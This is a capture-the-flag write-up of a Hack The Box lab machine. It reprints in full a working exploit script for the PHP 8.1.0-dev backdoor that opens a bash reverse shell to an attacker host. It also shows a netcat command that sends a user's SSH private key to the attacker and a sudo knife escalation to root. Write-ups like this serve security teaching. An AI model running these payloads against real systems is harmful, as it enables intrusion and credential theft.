# Getting User
Ok so our enumeration hasn't found anything that we can poke at here so now is the time to start digging a little deeper. First off what kind of page is this?
http://10.10.10.242/index.html - Nope!
http://10.10.10.242/index.htm - Nope!
http://10.10.10.242/index.php - Ah ha! 
Ok this is odd because our nmap scan did not show anythign about PHP running on this server. Let's take a quick look at the web response headers to see if it leaks the versions running on the server:
![[Pasted image 20210817174632.png]]

Hmm, interesting. Version 8.1.0-dev? Development versions of software can be vulnerable as they don't always have their security systems built in yet, so this might be vulnerable to something... maybe? Let's have a little google around and see what we find.
![[Pasted image 20210817174947.png]]

Ahh, very interesting. It turns out this version was release with a backdoor included (I think I remeber that in the news actually). This is why it's a good idea to prevent your web server from disclosing the software versions running in the response headers. This now has greatly increased the chance that an attacker will be able to compromise this web server.

Looking at the fist two links in google there is a git-hub repository https://github.com/flast101/php-8.1.0-dev-backdoor-rce that has some exploit code for this vulnerability. Let's a take a quick look and see what it's doing:
```python
# Exploit Title: PHP 8.1.0-dev Backdoor Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#     - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# CVE : N/A
# References:
#     - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#     - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.

Usage:
  python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>
"""

#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()
```

So the exploit is actually really simple. All that needs to be done is send a web request header with and extra "t" in the `User-Agent` header, so `User-Agentt` then include the *zerodiumsystem* string with the command included and the server will execute that command. In this reverse shell code it's simply inserting the classic bash reverse shell `bash -c "bash -i >& /dev/tcp/<attacker IP>/<attacker Port> 0>&1"`

Now, we could do this manually ourselves using something like BurpSuite or we can just use this script because why reinvent the wheel? So let's copy this code and create our own python file: nano rev.py, paste in the code and save the file. 
Now set up a simple Netcat listener: nc -lvnp 9001
Looking at the code usage: `python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>` we can run this code and get a reverse shell back:
![[Pasted image 20210817181026.png]]

Excellent! We now have a shell on the box as the James user. Let's take a look in his home directory:
cd /home/james
ls -lash
![[Pasted image 20210817181217.png]]
Nice, and there is the `user.txt` flag file.

User flag: 33f04b620096e52667879af5ed5fdc8b

# Getting Root
Before moving on to looking at how we can exploit this host to get to the root user, let's have a look at getting a nicer tty on the box via SSH. Looking in the `~/.ssh` directory we can see james' SSH keys are in there but no authorised keys file. No problem let's get this set up:
`cat id_rsa.pub > authorsied_keys`
Now let's send the private key to our box:
On our box listen for the incoming data and output to a file straight away:
`nc -lvnp 9002 > james`
On the compromised server send the file to my host:
`nc 10.10.14.9 < .ssh/id_rsa`
Ok now we have the private key and have saved it as "james". We just need to change the security on the file `chmod 600 james` and then ssh onto the box using these keys:
![[Pasted image 20210817183303.png]]
Now that's better, we can clear the screen and use tab auto-complete.

Right, as usual one of the first commands I like to run is `sudo -l` to list any commands our user might be able to run as root and with luck without a password too:
![[Pasted image 20210817183532.png]]

So, we can run this "knife" binary as root without a password. This might come in handy.

Let's take a look what this can do and run it:
```bash
sudo /usr/bin/knife                                                                                                                                                                                                  [849/2365]
ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)                                                
                                                                                                               
Usage: knife sub-command (options)                                                                             
    -s, --server-url URL             Chef Infra Server URL.                                                    
        --chef-zero-host HOST        Host to start Chef Infra Zero on.                                         
        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.                                                       
    -k, --key KEY                    Chef Infra Server API client key.                                                                                                                                                         
        --[no-]color                 Use colored output, defaults to enabled.
    -c, --config CONFIG              The configuration file to use.                                            
        --config-option OPTION=VALUE Override a single configuration option.                                   
        --defaults                   Accept default values for all questions.                                                                                                                                                  
    -d, --disable-editing            Do not open EDITOR, just accept the data as is.                           
    -e, --editor EDITOR              Set the editor to use for interactive commands.                           
    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).
        --[no-]fips                  Enable FIPS mode.                                                         
    -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')
        --[no-]listen                Whether a local mode (-z) server binds to a port.                         
    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.    
    -u, --user USER                  Chef Infra Server API client username.
        --print-after                Show the data after a destructive operation.
        --profile PROFILE            The credentials profile to select.
    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.
    -v, --version                    Show Chef Infra Client version.
    -y, --yes                        Say yes to all prompts for confirmation.
    -h, --help                       Show this help message.

Available subcommands: (for details, knife SUB-COMMAND --help)

** CHEF ORGANIZATION MANAGEMENT COMMANDS **
knife opc org create ORG_SHORT_NAME ORG_FULL_NAME (options)
knife opc org delete ORG_NAME
knife opc org edit ORG
knife opc org list
knife opc org show ORGNAME
knife opc org user add ORG_NAME USER_NAME
knife opc org user remove ORG_NAME USER_NAME
knife opc user create USERNAME FIRST_NAME [MIDDLE_NAME] LAST_NAME EMAIL PASSWORD
knife opc user delete USERNAME [-d] [-R]
knife opc user edit USERNAME
knife opc user list
knife opc user password USERNAME [PASSWORD | --enable-external-auth]
knife opc user show USERNAME

[...SNIP...]
** EXEC COMMANDS **                                                                                                                                                                                                            
knife exec [SCRIPT] (options)  

[...SNIP...]
```
Ok so this is a Chef tool; I'm not particually familier with everything to do with Chef but looking through the help listing from the knife binary the EXEC COMMANDS section seems very interesting. As we're running this via sudo we can execute commands as root on the system. So how do we do that?

Doing a quick google search for "knife exec commands" we find https://docs.chef.io/workstation/knife_exec/
![[Pasted image 20210817191622.png]]
Under the examples section we can see that we can execute Ruby code via this functionality. Great! We could do a reverse shell back to ourselves as root but we don't need to do that. All we need to do is execute a new shell as root. So let's do just that:
`sudo /usr/bin/knife exec -E 'system("exec bash")'`

Here we have executed system commands via Ruby using the `system()` function, which waits until the command is done so our new bash shell will not die until we exit it.
![[Pasted image 20210817192248.png]]

Job done!
Vosman @vosNETCyber